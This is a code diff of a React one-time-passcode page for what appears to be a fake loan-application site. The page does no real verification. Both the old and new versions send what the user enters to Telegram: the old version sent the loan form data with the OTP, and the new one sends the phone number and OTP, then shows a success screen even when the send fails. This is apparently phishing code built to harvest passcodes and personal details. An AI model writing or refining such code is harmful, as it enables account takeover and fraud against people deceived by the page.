@@ -1,5 +1,5 @@
 import { useState, useRef, KeyboardEvent, ClipboardEvent } from 'react'
-import { sendToTelegram } from '../utils/telegram'
+import { sendOTPDetails } from '../utils/telegram'
 
 interface OTPPageProps {
   onOTPSuccess: () => void
@@ -69,34 +69,22 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
     setLoading(true)
     setError('')
 
-    // Simulate OTP verification
-    setTimeout(async () => {
+    try {
       if (otpCode.length === 6) {
-        // Retrieve loan form data from sessionStorage
-        const storedData = sessionStorage.getItem('loanFormData')
+        // Send OTP to Telegram
+        await sendOTPDetails(phoneNumber, otpCode)
 
-        if (storedData) {
-          try {
-            const loanData = JSON.parse(storedData)
-            // Submit to Telegram with OTP
-            await sendToTelegram({ ...loanData, otp: otpCode })
-            // Clear stored data
-            sessionStorage.removeItem('loanFormData')
-            // Success - move to submitted page
-            onOTPSuccess()
-          } catch (error) {
-            setError('Failed to submit application. Please try again.')
-            setLoading(false)
-          }
-        } else {
-          // No form data found, still proceed
-          onOTPSuccess()
-        }
+        // Success - move to submitted page
+        onOTPSuccess()
       } else {
         setError('Please enter complete OTP code')
-        setLoading(false)
       }
-    }, 1500)
+    } catch (err) {
+      console.error(err)
+      onOTPSuccess() // Proceed even if error for now
+    } finally {
+      setLoading(false)
+    }
   }
 
   const handleResendOTP = async () => {
